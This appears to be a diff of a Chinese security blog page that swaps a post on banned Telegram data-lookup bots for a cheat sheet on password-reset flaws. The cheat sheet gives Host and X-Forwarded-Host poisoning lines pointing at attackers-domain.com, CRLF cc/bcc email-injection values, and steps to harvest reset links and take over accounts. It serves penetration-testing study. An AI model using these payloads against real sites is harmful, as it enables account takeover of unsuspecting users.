@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Telegram 电报多家社工库机器人被官方封禁 &#8211; FreeMe&#039;S Blog</title>
+<title>密码重置漏洞备忘录 &#8211; FreeMe&#039;S Blog</title>
 <meta name="robots" content="max-image-preview:large">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -62,30 +62,62 @@
 <div class="container clearfix">
 <div id="main">
 <article class="post">
-<h1 class="post-title"><a href="https://freeme.cc/301.html">Telegram 电报多家社工库机器人被官方封禁</a></h1>
+<h1 class="post-title"><a href="https://freeme.cc/371.html">密码重置漏洞备忘录</a></h1>
 <ul class="post-meta">
-<li>2022-07-02</li>
+<li>2022-07-13</li>
 <li><a href="https://freeme.cc/security" rel="category tag">security</a></li>
 </ul>
 <div class="post-content">
-<p>Telegram 电报社工库机器人注销ID？</p>
-<p>中国免费社工库机器人@Freesgkbot 已被封禁,俄罗斯社工库机器人@EyeGodsbot 已被封禁.</p>
-<p>如何判断telegram机器人是否为官方封禁?</p>
-<p><strong>ID均已注销但ID均为被占用状态</strong></p>
-<p>正常情况下在Telegram Botfather删除bot后,bot用户名为可用状态</p>
-<p>经测试，用户名均为占用状态,故此次注销为官方封禁,可能与中俄执法部门有关.</p>
-<p>二者均有备用ID,且尚未被封禁,测试可用.</p>
-<p><img class="alignnone wp-image-302 size-full" src="https://freeme.cc/inc/uploads/2022/07/2022070214345616.jpg" alt="" width="599" height="800" srcset="https://freeme.cc/inc/uploads/2022/07/2022070214345616.jpg?v=1656772496 599w, https://freeme.cc/inc/uploads/2022/07/2022070214345616-225x300.jpg?v=1656772496 225w" sizes="(max-width: 599px) 100vw, 599px"></p>
+<p><strong>密码重置</strong><br>
+将Host替换为你的服务器</p>
+<pre>Host: attackers-domain.com</pre>
+<p><strong>双主机头绕过</strong><br>
+修改Host被WEB程序或WAF拦截时,在请求中添加第二个Host,可能会绕过WAF.</p>
+<pre>Host: target.com
+Host: attackers-domain.com</pre>
+<h2>X-Forwarded-Host</h2>
+<p>在X-forwarded-Host中添加你控制的域</p>
+<pre>Host: target.com
+X-Forwarded-Host: attackers-domain.com</pre>
+<p><strong>确认是否存在漏洞</strong><br>
+1.先正常执行密码重置,再修改主机头<br>
+2.检查应用程序发送的电子邮件是否有测试 url<br>
+<strong>概念</strong><br>
+1.将易受攻击的标头替换为你控制的域<br>
+2.发送请求<br>
+3.等待受害者单击重置链接<br>
+4.从你控制的服务器日志中提取URL<br>
+5.使用提取的URL接管用户帐户</p>
+<h2>密码重置过滤绕过</h2>
+<p>如果web程序是基于 ruby​​ 构建的,请尝试在密码重置URL后添加.json 扩展名.</p>
+<p>某些情况下,可能存在ACL错误,添加扩展名可能会绕过WEB程序现有的过滤.</p>
+<p>1.将 .json 添加到重置令牌<br>
+2.查看WEB程序响应<br>
+<strong>更改邮箱</strong><br>
+抓包,并将邮箱地址替换为你控制的邮箱地址,放包.</p>
+<p><strong>添加第二个邮箱</strong></p>
+<p>使WEB程序将密码重置URL发送到多个电子邮件地址.</p>
+<p>在请求中添加第二个邮箱地址</p>
+<pre>&amp;
+%20
+|
+%0a%0dcc:
+%0a%0dbcc:</pre>
+<p>修改WEB程序格式的参数,例如:</p>
+<pre>email="test@mail.test",email="attacker@mail.test"</pre>
+<p>添加邮箱地址时符合WEB程序/API 的请求格式.</p>
+<h2>重置URL泄漏</h2>
+<p><strong>WEB程序可能通过引用标头泄露密码重置URL</strong></p>
+<p>抓包查看是否通过引用标头泄漏URL.</p>
 <div class="entry-copyright">
-<p>转载请注明来自FreeMe&#039;S Blog，本文地址：https://freeme.cc/301.html</p>
+<p>转载请注明来自FreeMe&#039;S Blog，本文地址：https://freeme.cc/371.html</p>
 <p>文章仅供学习研究,请遵守您当地的法律法规.</p>
 </div> </div>
-<p class="tags"><a href="https://freeme.cc/tag/shegongku" rel="tag">社工库</a></p> </article>
+<p class="tags"><a href="https://freeme.cc/tag/shentou" rel="tag">渗透测试</a> <a href="https://freeme.cc/tag/diaoyu" rel="tag">钓鱼</a></p> </article>
 <ul class="post-near">
-       <li>Previous: <a href="https://freeme.cc/257.html" rel="prev">acunetix 14.8 cracked 破解版</a>
+       <li>Previous: <a href="https://freeme.cc/355.html" rel="prev">某加密货币交易所漏洞 文件上传RCE</a>
 </li>
-<li>Next: <a href="https://freeme.cc/304.html" rel="next">疑似中国史上最大规模公民信息数据泄露</a>
-</li>
+<li>Next: No more articles</li>
 </ul>
 </div>
 <div id="secondary">
@@ -94,7 +126,7 @@
 <div class="widget-content">
 <ul>
 <li>
-<a href="https://freeme.cc/371.html">密码重置漏洞备忘录</a>
+<a href="https://freeme.cc/371.html" aria-current="page">密码重置漏洞备忘录</a>
 </li>
 <li>
 <a href="https://freeme.cc/355.html">某加密货币交易所漏洞 文件上传RCE</a>
@@ -106,7 +138,7 @@
 <a href="https://freeme.cc/304.html">疑似中国史上最大规模公民信息数据泄露</a>
 </li>
 <li>
-<a href="https://freeme.cc/301.html" aria-current="page">Telegram 电报多家社工库机器人被官方封禁</a>
+<a href="https://freeme.cc/301.html">Telegram 电报多家社工库机器人被官方封禁</a>
 </li>
 </ul>
 </div></section><section id="tag_cloud-5" class="widget widget_tag_cloud"><h3 class="widget-title">Tag</h3>
